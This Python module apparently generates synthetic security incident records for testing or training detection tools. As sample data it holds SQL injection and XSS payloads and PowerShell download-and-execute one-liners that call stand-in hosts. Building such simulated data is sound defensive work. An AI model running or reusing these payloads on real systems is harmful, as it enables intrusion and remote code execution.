import random
import uuid
from datetime import datetime, timezone
from generator.utils import generate_incident_id, get_current_timestamp, generate_random_ip, generate_fake_hash, load_template
    
def generate_phishing_incident():
    template = load_template("phishing")

    subjects = [
        "Reset your password", "Invoice overdue",
        "You’ve won a prize!", "Security alert on your account"
    ]
    domains = ["malicious-site.biz", "click-here-now.net", "login-update.com"]
    target_users = ["alice@acme.corp", "bob@corp.local", "user123@domain.com"]

    template["id"] = generate_incident_id()
    template["timestamp"] = get_current_timestamp()
    template["source_ip"] = generate_random_ip()
    template["target_user"] = random.choice(target_users)
    template["subject"] = random.choice(subjects)
    template["iocs"] = [random.choice(domains)]

    return template

def generate_bruteforce_incident():
    template = load_template("bruteforce")

    usernames = ["admin", "root", "jsmith", "alice"]
    endpoints = ["/login", "/auth", "/admin", "/api/auth"]
    target_users = ["bob@company.com", "carol@domain.net", "hr@acme.corp"]

    template["id"] = generate_incident_id()
    template["timestamp"] = get_current_timestamp()
    template["source_ip"] = generate_random_ip()
    template["target_user"] = random.choice(target_users)
    template["username_attempted"] = random.choice(usernames)
    template["login_endpoint"] = random.choice(endpoints)
    template["attempt_count"] = random.randint(5, 20)

    return template

def generate_malware_incident():
    template = load_template("malware")

    malware_names = ["Emotet", "TrickBot", "FormBook", "AgentTesla", "Remcos"]
    file_paths = [r"C:\Users\Public\winlogon.exe", r"/tmp/evil.sh", r"/usr/local/bin/update"]
    hosts = ["host01.internal", "hr-laptop-22", "dev-machine-07"]

    template["id"] = generate_incident_id()
    template["timestamp"] = get_current_timestamp()
    template["source_ip"] = generate_random_ip()
    template["affected_host"] = random.choice(hosts)
    template["malware_name"] = random.choice(malware_names)
    template["file_path"] = random.choice(file_paths)
    template["file_hash"] = generate_fake_hash()  # Hash simulado

    return template

def generate_ransomware_incident():
    template = load_template("ransomware")

    families = ["LockBit", "Conti", "BlackCat", "REvil", "Clop"]
    extensions = [".locked", ".enc", ".payme", ".crypted", ".fuck"]
    ransom_notes = [
        r"C:\Users\Public\README.txt",
        r"/home/user/README_FOR_RESCUE.txt"
    ]
    btc_wallets = [
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
        "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy",
        "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kygt080"
    ]
    infected_hosts = ["finance-srv01", "hr-laptop-09", "dev-ubuntu-22"]

    template["id"] = generate_incident_id()
    template["timestamp"] = get_current_timestamp()
    template["source_ip"] = generate_random_ip()
    template["infected_host"] = random.choice(infected_hosts)
    template["ransomware_family"] = random.choice(families)
    template["encrypted_extensions"] = random.sample(extensions, k=2)
    template["ransom_note_path"] = random.choice(ransom_notes)
    template["btc_wallet"] = random.choice(btc_wallets)
    

    return template

def generate_data_exfiltration_incident():
    template = load_template("data_exfiltration")

    data_types = ["PII", "credentials", "intellectual property", "HR records", "financial reports"]
    protocols = ["FTP", "HTTP", "HTTPS", "DNS", "SMB"]
    hosts = ["legal-srv01", "vpn-gateway", "secops-laptop", "rdp-win10-3"]

    template["id"] = generate_incident_id()
    template["timestamp"] = get_current_timestamp()
    template["source_ip"] = generate_random_ip()
    template["source_host"] = random.choice(hosts)
    template["destination_ip"] = generate_random_ip()
    template["protocol"] = random.choice(protocols)
    template["data_type"] = random.choice(data_types)
    template["data_volume_mb"] = round(random.uniform(0.5, 250), 2)

    return template

def generate_command_and_control_incident():
    template = load_template("command_and_control")

    infected_hosts = ["host-dev01", "hr-win11", "vpn-compromised", "ws-corp-02"]
    c2_domains = ["cnc.evilcorp.com", "command.darkweb.net", "c2panel.anonym.tld"]
    protocols = ["HTTPS", "DNS", "HTTP", "TLS", "WebSocket"]

    template["id"] = generate_incident_id()
    template["timestamp"] = get_current_timestamp()
    template["infected_host"] = random.choice(infected_hosts)
    template["c2_ip"] = generate_random_ip()
    template["c2_domain"] = random.choice(c2_domains)
    template["protocol"] = random.choice(protocols)
    template["beacon_interval_sec"] = random.choice([10, 30, 60, 300, 900])

    return template

def generate_insider_threat_incident():
    template = load_template("insider_threat")

    usernames = ["jdoe", "hr-manager", "backup-admin", "it_support", "intern-23"]
    roles = ["HR", "IT", "Finance", "Intern", "Developer"]
    actions = [
        "accessed payroll database out of hours",
        "downloaded over 200 documents",
        "accessed confidential project repo",
        "disabled EDR agent",
        "exported full mailbox to PST"
    ]
    resources = [
        "payroll_db", "confidential_share", "vpn_logs", "employee_email", "source_code_repo"
    ]
    justifications = [
        "needed for report", "requested by manager", "not specified", "temporary access", "unknown"
    ]

    template["id"] = generate_incident_id()
    template["timestamp"] = get_current_timestamp()
    template["username"] = random.choice(usernames)
    template["user_role"] = random.choice(roles)
    template["suspicious_action"] = random.choice(actions)
    template["target_resource"] = random.choice(resources)
    template["justification_provided"] = random.choice(justifications)

    return template

def generate_port_scanning_incident():
    template = load_template("port_scanning")

    tools = ["nmap", "masscan", "zmap", "netcat", "angryIP"]
    scan_types = ["TCP SYN", "TCP Connect", "UDP", "Ping Sweep", "Stealth"]
    scanned_ports = sorted(random.sample(range(20, 1024), k=random.randint(3, 10)))

    template["id"] = generate_incident_id()
    template["timestamp"] = get_current_timestamp()
    template["scanner_ip"] = generate_random_ip()
    template["target_ip"] = generate_random_ip()
    template["scanned_ports"] = scanned_ports
    template["tool_used"] = random.choice(tools)
    template["scan_type"] = random.choice(scan_types)

    return template

def generate_web_exploit_incident():
    template = load_template("web_exploit")

    endpoints = ["/login", "/search", "/admin", "/product?id=13", "/api/user"]
    methods = ["GET", "POST"]
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL, NULL, NULL --",
        "<script>alert('XSS')</script>",
        "' OR EXISTS(SELECT * FROM users)--"
    ]
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "curl/7.68.0",
        "sqlmap/1.5.1#stable",
        "Nmap NSE",
        "Python-urllib/3.8"
    ]
    exploit_types = ["SQL Injection", "XSS", "Command Injection", "Local File Inclusion", "Directory Traversal"]

    template["id"] = generate_incident_id()
    template["timestamp"] = get_current_timestamp()
    template["attacker_ip"] = generate_random_ip()
    template["vulnerable_endpoint"] = random.choice(endpoints)
    template["http_method"] = random.choice(methods)
    template["payload"] = random.choice(payloads)
    template["user_agent"] = random.choice(user_agents)
    template["exploit_type"] = random.choice(exploit_types)

    return template

def generate_suspicious_powershell_incident():
    template = load_template("suspicious_powershell")

    hosts = ["hr-windows10", "dev-vm-win11", "dc01", "secops-laptop"]
    users = ["jsmith", "admin", "svc_backup", "intern23"]
    commands = [
        "powershell -enc aQBlAHgAIAAiAHMAbQBhAHIAdABzAGMAcgBlAGUAbgAiAA==",
        "powershell IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')",
        "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://x.x.x.x/payload.ps1')\"",
        "powershell -Command \"Get-Content C:\\Users\\*.ps1 | Out-File C:\\temp\\all_scripts.txt\"",
        "powershell -ep bypass -nop -file .\\bypass.ps1"
    ]
    parents = ["explorer.exe", "winword.exe", "outlook.exe", "cmd.exe", "teams.exe"]
    contexts = ["user", "admin", "scheduled_task", "startup", "remote_session"]

    template["id"] = generate_incident_id()
    template["timestamp"] = get_current_timestamp()
    template["host"] = random.choice(hosts)
    template["user"] = random.choice(users)
    template["command"] = random.choice(commands)
    template["parent_process"] = random.choice(parents)
    template["execution_context"] = random.choice(contexts)

    return template
